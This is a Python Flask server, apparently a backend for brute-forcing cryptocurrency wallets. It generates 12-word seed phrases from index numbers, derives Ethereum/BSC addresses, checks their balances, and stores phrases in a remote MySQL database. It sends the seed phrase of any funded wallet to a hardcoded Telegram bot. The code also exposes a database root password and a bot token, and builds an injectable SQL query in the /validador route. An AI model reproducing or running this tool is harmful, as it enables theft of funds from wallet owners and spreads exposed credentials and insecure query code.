from flask import Flask, jsonify, request
from web3 import Web3
import config
import mysql.connector
import random, sys, os
import validadores
import array_palavras
import requests
import resource
resource.setrlimit(resource.RLIMIT_AS, ((10 * 1024 * 1024 * 16),(10 * 1024 * 1024 * 16)))
print(resource.getrlimit(resource.RLIMIT_AS))

select_em = 100
deleta_em = 200

app = Flask(__name__)

livros = [
    {
        'id': 1,
        'título': 'O Senhor dos Anéis - A Sociedade do Anel',
        'autor': 'J.R.R Tolkien'
    },
    {
        'id': 2,
        'título': 'Harry Potter e a Pedra Filosofal',
        'autor': 'J.K Howling'
    },
    {
        'id': 3,
        'título': 'James Clear',
        'autor': 'Hábitos Atômicos'
    },
]
wallet=[]
palavras2=[]

# Consultar(todos)
@app.route('/total',methods=['GET'])
def total():
    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
    mycursor = mydb.cursor()
    sql = "SELECT count(*) FROM frase"
    mycursor.execute(sql)
    myresult = mycursor.fetchall()
    mycursor.close()
    mydb.close()    
    return jsonify(myresult)


# Consultar(todos)
@app.route('/palavras',methods=['GET'])
def obter_wallet():
    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
    mycursor = mydb.cursor()
    #sql = "SELECT frase FROM (SELECT ROUND(RAND() * (SELECT MAX(id) FROM frase)) random_num, @num:=@num + 1 FROM (SELECT @num:=0) AS a, frase LIMIT "+str(select_em)+") AS b, frase AS t WHERE b.random_num = t.id"
    sql = "SELECT frase FROM frase AS t1 JOIN (SELECT id FROM frase ORDER BY RAND() LIMIT "+str(select_em)+") as t2 ON t1.id=t2.id"
    #sql = "SELECT frase FROM frase LIMIT "+str(select_em)+""
    #sql = "SELECT frase FROM frase ORDER BY id DESC LIMIT "+str(select_em)+""
    mycursor.execute(sql)
    myresult = mycursor.fetchall()
    mycursor.close()
    mydb.close()    
    return jsonify(myresult)

@app.route('/validador',methods=['POST'])
def validador():
    server = request.get_json()
    serv_name = server['serv_name']
    deleta_em = server['deleta_em']
    
    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
    mycursor = mydb.cursor()
    sql = "INSERT INTO validadores (id,validador,total,data) VALUES (NULL, '"+serv_name+"', '"+str(deleta_em)+"', CURRENT_TIMESTAMP) ON DUPLICATE KEY UPDATE validador='"+serv_name+"', total=total+'"+str(deleta_em)+"', data=now();"
    mycursor.execute(sql);mydb.commit();mycursor.close();mydb.close()    
    return jsonify({"sucess": "ok"})

@app.route('/inclusao_palavras',methods=['POST'])
def inclusao_palavras():
    palavras = request.get_json()
    #print(palavras)
    for p in palavras:
        palavras2.append((str(p['mnemonic']),str(p['seq']),str(p['wallet']),str(p['wallet']),),)       
    total_registros = len(palavras2)
    
    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
    mycursor = mydb.cursor()
    sql = """INSERT INTO frase (id,frase,seq,wallet,balance,data) SELECT NULL, %s, %s, %s, 'x', NOW() WHERE NOT EXISTS (SELECT wallet FROM frase WHERE wallet =%s) """
    
    try:
        mycursor.executemany(sql, palavras2)
    except:
        try:
            mycursor.executemany(sql, palavras2)
        except:
            pass
        else:
            mydb.commit();palavras2.clear();
            mycursor.close();mydb.close();
    else:
        mydb.commit();palavras2.clear();
        mycursor.close();mydb.close();

    return jsonify({"inclusao": ""+str(total_registros)+""})


val=[]
@app.route('/delete_wallet',methods=['POST'])
def delete_wallet():
    wallet = request.get_json()
    #print(wallet)
    for w in wallet:
        val.append((str(w['wallet']),),)        
    #print(val)
    total_registros = len(val)
    mydb = mysql.connector.connect(host="191.252.60.124",user="root",password="R0n3y@c3rt3@$3nh@",database="shieldtokencoin")
    mycursor = mydb.cursor()
    sql = """DELETE FROM frase WHERE frase.wallet = %s""";
    #print(mycursor.executemany(sql, val))
    try:
        mycursor.executemany(sql, val)
    except:
        try:
            mycursor.executemany(sql, val)
        except:
            pass
        else:
            mydb.commit();val.clear();
            mycursor.close();mydb.close();
    else:
        mydb.commit();val.clear();
        mycursor.close();mydb.close();

    return jsonify({"delete": ""+str(total_registros)+""})


    

# Consultar(id)
@app.route('/livros/<int:id>',methods=['GET'])
def obter_livro_por_id(id):
    for livro in livros:
        if livro.get('id') == id:
            return jsonify(livro)
# Editar
@app.route('/livros/<int:id>',methods=['PUT'])
def editar_livro_por_id(id):
    livro_alterado = request.get_json()
    for indice,livro in enumerate(livros):
        if livro.get('id') == id:
            livros[indice].update(livro_alterado)
            return jsonify(livros[indice])

# Excluir
@app.route('/livros/<int:id>',methods=['DELETE'])
def excluir_livro(id):
    for indice, livro in enumerate(livros):
        if livro.get('id') == id:
            del livros[indice]

    return jsonify(livros)


w3 = Web3()
rand = random.randint(0,32)
web3 = Web3(Web3.HTTPProvider(validadores.bsc[int(rand)]))
w3.eth.account.enable_unaudited_hdwallet_features()



#####################################################################################################################
@app.route('/converte_numero_em_frase_e_validade_se_sequencia_eh_valida',methods=['POST'])
def converte_numero_em_frase_e_validade_se_sequencia_eh_valida():
    global wallet
    global balance
    wallet = "none"
    balance = "none"
    p = request.get_json()
    #for p in palavra:
    #    val.append((str(p['palavra']),),)  
    print(str(p['1'])+" "+str(p['2'])+" "+str(p['3'])+" "+str(p['4'])+" "+str(p['5'])+" "+str(p['6'])+" "+str(p['7'])+" "+str(p['8'])+" "+str(p['9'])+" "+str(p['10'])+" "+str(p['11'])+" "+str(p['12']))
    mnemonic = str(array_palavras.p2[int(p['1'])])+" "+str(array_palavras.p2[int(p['2'])])+" "+str(array_palavras.p2[int(p['3'])])+" "+str(array_palavras.p2[int(p['4'])])+" "+str(array_palavras.p2[int(p['5'])])+" "+str(array_palavras.p2[int(p['6'])])+" "+str(array_palavras.p2[int(p['7'])])+" "+str(array_palavras.p2[int(p['8'])])+" "+str(array_palavras.p2[int(p['9'])])+" "+str(array_palavras.p2[int(p['10'])])+" "+str(array_palavras.p2[int(p['11'])])+" "+str(array_palavras.p2[int(p['12'])])
    print(mnemonic)
    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
    try:
        acc = w3.eth.account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/0")
    except:
        pass
    else:
        #total_wallet=int(total_wallet+1)
        #inicio = time.perf_counter()
        wallet = str(acc.address)
        #balance = web3.eth.get_balance(wallet)
        #print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
        print("wallet "+str(wallet)+" mnemonic "+str(mnemonic))
    return jsonify({"mnemonic":""+str(wallet)+""})
    

#####################################################################################################################



@app.route('/balance',methods=['POST'])
def balance():
    global wallet
    global balance
    wallet = "none"
    balance = "none"
    p = request.get_json()
    #for p in palavra:
    #    val.append((str(p['palavra']),),)  
    print(str(p['1'])+" "+str(p['2'])+" "+str(p['3'])+" "+str(p['4'])+" "+str(p['5'])+" "+str(p['6'])+" "+str(p['7'])+" "+str(p['8'])+" "+str(p['9'])+" "+str(p['10'])+" "+str(p['11'])+" "+str(p['12']))
    mnemonic = str(p['1'])+" "+str(p['2'])+" "+str(p['3'])+" "+str(p['4'])+" "+str(p['5'])+" "+str(p['6'])+" "+str(p['7'])+" "+str(p['8'])+" "+str(p['9'])+" "+str(p['10'])+" "+str(p['11'])+" "+str(p['12'])
    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
    try:
        acc = w3.eth.account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/0")
    except:
        pass
    else:
        #total_wallet=int(total_wallet+1)
        #inicio = time.perf_counter()
        wallet = str(acc.address)
        balance = web3.eth.get_balance(wallet)
    print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(balance)+"", "mnemonic":""+str(mnemonic)+""})





@app.route('/balance2',methods=['POST'])
def balance2():
    os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
    p = request.get_json()
    global wallet
    global balance
    global mnemonic
    wallet = str(p['wallet'])
    balance = str(0)
    mnemonic = str(p['mnemonic'])
    
    
    
    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
    try:    
        balance = web3.eth.get_balance(wallet)
    except:
        pass
    else:
        print("wallet "+str(wallet)+" balance "+str(balance)+" mnemonic "+str(mnemonic))
        if balance != 0:
            #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
            payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
            r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
            #arquivo = open("wallet_"+str(id)+".txt", "a")
            #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")                                    
    return jsonify({"wallet": ""+str(wallet)+"","balance": ""+str(balance)+"", "mnemonic":""+str(mnemonic)+""})

PORTA=int(sys.argv[1])
os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
app.run(host='0.0.0.0',port=PORTA,debug=True)
os.system('sync; echo 3 > /proc/sys/vm/drop_caches')
#C:/Users/roney/AppData/Local/Programs/Python/Python311/python.exe c:/Users/roney/Desktop/Automatizacao_Python/v8/app.py 80